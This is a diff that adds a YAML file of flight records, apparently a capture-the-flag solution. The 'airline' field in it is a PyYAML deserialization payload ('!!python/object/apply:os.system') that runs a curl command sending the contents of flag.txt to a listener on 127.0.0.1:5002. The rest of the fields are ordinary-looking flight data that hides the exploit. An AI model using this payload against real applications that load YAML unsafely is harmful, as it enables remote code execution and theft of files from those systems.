@@ -1,0 +1,6 @@
+- code: 'tits'
+  airline: !!python/object/apply:os.system ["curl http://127.0.0.1:5002/?s=$(cat flag.txt)"]
+  from: 'PER'
+  to: 'SYD'
+  deptTime: '14-04-2020 02:41'
+  arriveTime: '14-04-2020 06:53'
